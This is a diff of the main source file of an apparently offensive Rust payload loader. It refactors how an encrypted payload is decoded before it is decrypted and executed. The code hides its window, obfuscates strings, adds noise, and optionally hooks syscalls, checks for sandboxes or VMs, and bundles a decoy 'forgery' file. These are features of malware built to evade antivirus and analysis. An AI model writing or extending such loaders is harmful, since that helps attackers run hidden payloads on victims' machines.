@@ -1,62 +1,41 @@
 #![windows_subsystem = "windows"]
-mod forgery;
-mod guard;
 mod utils;
 mod load_payload;
 use utils::obfuscation_noise;
 mod exec;
 mod decrypt;
 mod alloc_mem;
-use load_payload::load_payload;
+mod decode;
 
-use rustcrypt_ct_macros::obf_lit;
-use decrypt::decrypt;
-use exec::exec;
 use std::process;
+use rustcrypt_ct_macros::obf_lit;
+use load_payload::load_payload;
+use decrypt::decrypt;
+use decode::decode_payload;
+use exec::exec;
+
+#[cfg(feature = "with_forgery")]
+mod forgery;
 
 #[cfg(feature = "veh_syscall")]
 use rust_veh_syscalls::{initialize_hooks, destroy_hooks};
 
-#[cfg(feature = "base32_decode")]
-#[allow(dead_code)]
-fn base32_decode_payload(data: &[u8]) -> Option<Vec<u8>> {
-    let raw = std::str::from_utf8(data).ok()?;
-    base32::decode(base32::Alphabet::Rfc4648 { padding: true }, raw)
-}
-
-#[cfg(feature = "base64_decode")]
-#[allow(dead_code)]
-fn base64_decode_payload(data: &[u8]) -> Option<Vec<u8>> {
-    use base64::Engine;
-    base64::engine::general_purpose::STANDARD.decode(data).ok()
-}
-
-#[cfg(feature = "urlsafe_base64_decode")]
-#[allow(dead_code)]
-fn urlsafe_base64_decode_payload(data: &[u8]) -> Option<Vec<u8>> {
-    use base64::Engine;
-    base64::engine::general_purpose::URL_SAFE.decode(data).ok()
-}
-
-#[cfg(feature = "hex_decode")]
-#[allow(dead_code)]
-fn hex_decode_payload(data: &[u8]) -> Option<Vec<u8>> {
-    let raw = std::str::from_utf8(data).ok()?;
-    hex::decode(raw.trim()).ok()
-}
 
 fn main() {
     #[cfg(feature = "veh_syscall")]
     initialize_hooks();
 
     #[cfg(feature = "sandbox")]
-    guard::guard_vm();
+    {
+        mod guard;
+        guard::guard_vm();
+    }
 
     obfuscation_noise();
 
     #[cfg(feature = "with_forgery")]
     forgery::bundle::bundlefile();
-
+    
     let encrypted_data = match load_payload() {
         Ok(data) => data,
         Err(e) => {
@@ -65,20 +44,7 @@ fn main() {
         }
     };
 
-    #[cfg(feature = "base64_decode")]
-    let decrypted_data = base64_decode_payload(&encrypted_data).unwrap();
-
-    #[cfg(feature = "urlsafe_base64_decode")]
-    let decrypted_data = urlsafe_base64_decode_payload(&encrypted_data).unwrap();
-
-    #[cfg(feature = "base32_decode")]
-    let decrypted_data = base32_decode_payload(&encrypted_data).unwrap();
-
-    #[cfg(feature = "hex_decode")]
-    let decrypted_data = hex_decode_payload(&encrypted_data).unwrap();
-
-    #[cfg(feature = "none_decode")]
-    let decrypted_data = encrypted_data.to_vec();
+    let decrypted_data = decode_payload(&encrypted_data).unwrap();
 
     obfuscation_noise();
 
